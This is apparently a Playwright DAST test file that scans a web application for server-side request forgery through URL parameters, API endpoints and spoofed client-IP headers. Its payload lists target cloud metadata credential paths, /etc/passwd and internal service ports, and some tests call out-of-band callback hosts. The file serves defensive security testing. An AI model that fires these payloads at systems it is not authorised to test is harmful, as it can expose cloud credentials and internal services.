import { test, expect } from '@playwright/test';
import { DASTReporter } from '../utils/helpers';

const reporter = new DASTReporter();

const ssrfPayloads = [
  'http://localhost',
  'http://127.0.0.1',
  'http://0.0.0.0',
  'http://[::1]',
  'http://[::]',
  'http://localhost:22',
  'http://localhost:3306',
  'http://localhost:5432',
  'http://localhost:6379',
  'http://localhost:8080',
  'http://169.254.169.254', // AWS metadata
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal', // GCP metadata
  'http://metadata.google.internal/computeMetadata/v1/',
  'file:///etc/passwd',
  'file:///C:/windows/system32/drivers/etc/hosts',
  'dict://localhost:11211/',
  'ftp://localhost',
  'gopher://localhost',
];

const ssrfUrlVariants = [
  'url',
  'uri',
  'link',
  'href',
  'redirect',
  'next',
  'return',
  'callback',
  'target',
  'path',
  'src',
  'dest',
  'destination',
  'feed',
  'image',
  'webhook',
];

test.describe('SSRF (Server-Side Request Forgery) Tests', () => {
  test('Check for SSRF in URL parameters', async ({ page, request }) => {
    for (const param of ssrfUrlVariants) {
      for (const payload of ssrfPayloads) {
        try {
          const url = `/?${param}=${encodeURIComponent(payload)}`;
          const response = await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
          
          if (!response) continue;
          
          const bodyText = await page.locator('body').innerText().catch(() => '');
          const pageContent = await page.content();
          
          // Check for indicators of successful SSRF
          const ssrfIndicators = [
            'root:x:', // /etc/passwd content
            'daemon:x:',
            'bin:x:',
            'Windows IP Configuration',
            'ami-id', // AWS metadata
            'instance-id',
            'computeMetadata',
            'SSH-2.0',
            'MySQL',
            'PostgreSQL',
            'redis_version',
          ];
          
          for (const indicator of ssrfIndicators) {
            if (bodyText.includes(indicator) || pageContent.includes(indicator)) {
              reporter.addFinding({
                severity: 'critical',
                title: 'SSRF Vulnerability Confirmed',
                description: `Server fetched internal resource via "${param}" parameter`,
                url: url,
                payload,
                evidence: `Found: ${indicator}`,
                cwe: 'CWE-918',
                owasp: 'A10:2021 - Server-Side Request Forgery',
                recommendation: 'Implement strict URL validation, use allowlists, and disable unnecessary URL schemas',
              });
              break;
            }
          }
          
          // Check for timeout or connection errors that might indicate SSRF
          const errorIndicators = [
            'connection refused',
            'connection timed out',
            'no connection could be made',
            'unable to connect',
            'ECONNREFUSED',
            'ETIMEDOUT',
            'Connection refused',
          ];
          
          for (const error of errorIndicators) {
            if (bodyText.toLowerCase().includes(error.toLowerCase())) {
              reporter.addFinding({
                severity: 'high',
                title: 'Potential SSRF Vulnerability',
                description: `Server attempted connection to internal resource via "${param}"`,
                url: url,
                payload,
                evidence: `Connection error: ${error}`,
                cwe: 'CWE-918',
                owasp: 'A10:2021 - Server-Side Request Forgery',
                recommendation: 'Implement strict URL validation and use allowlists for allowed destinations',
              });
              break;
            }
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for blind SSRF via DNS callback', async ({ request }) => {
    // In a real scenario, you'd use a service like Burp Collaborator or interactsh
    // For now, we test for the vulnerability pattern
    const blindSsrfPayloads = [
      'http://ssrf-test.interactsh.com',
      'http://ssrf-test.burpcollaborator.net',
    ];
    
    const apiEndpoints = ['/api/fetch', '/api/webhook', '/api/preview', '/api/proxy'];
    
    for (const endpoint of apiEndpoints) {
      for (const payload of blindSsrfPayloads) {
        try {
          const response = await request.post(endpoint, {
            data: { url: payload },
            timeout: 15000,
          });
          
          // If the server takes time or returns success, it might be vulnerable
          if (response.status() === 200) {
            reporter.addFinding({
              severity: 'medium',
              title: 'Potential Blind SSRF',
              description: `Endpoint "${endpoint}" accepts external URLs without visible feedback`,
              url: endpoint,
              payload,
              cwe: 'CWE-918',
              owasp: 'A10:2021 - Server-Side Request Forgery',
              recommendation: 'Validate URLs against an allowlist and restrict internal network access',
            });
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for SSRF in HTTP headers', async ({ request }) => {
    // Some applications use headers to determine URLs
    const headerPayloads = [
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Real-IP': '127.0.0.1' },
      { 'X-Originating-IP': '127.0.0.1' },
      { 'X-Remote-IP': '127.0.0.1' },
      { 'X-Remote-Addr': '127.0.0.1' },
      { 'X-ProxyUser-Ip': '127.0.0.1' },
      { 'Client-IP': '127.0.0.1' },
      { 'True-Client-IP': '127.0.0.1' },
    ];
    
    for (const headers of headerPayloads) {
      try {
        const response = await request.get('/api/users', { headers });
        const body = await response.text();
        
        // Check if the headers affected the response in unexpected ways
        if (body.includes('admin') || body.includes('internal')) {
          reporter.addFinding({
            severity: 'high',
            title: 'SSRF via HTTP Headers',
            description: 'Application may be using client IP headers for internal routing',
            url: '/api/users',
            evidence: `Headers: ${JSON.stringify(headers)}`,
            cwe: 'CWE-918',
            owasp: 'A10:2021 - Server-Side Request Forgery',
            recommendation: 'Do not trust client-provided IP headers for internal decisions',
          });
        }
      } catch (e) {
        // Continue
      }
    }
  });
});
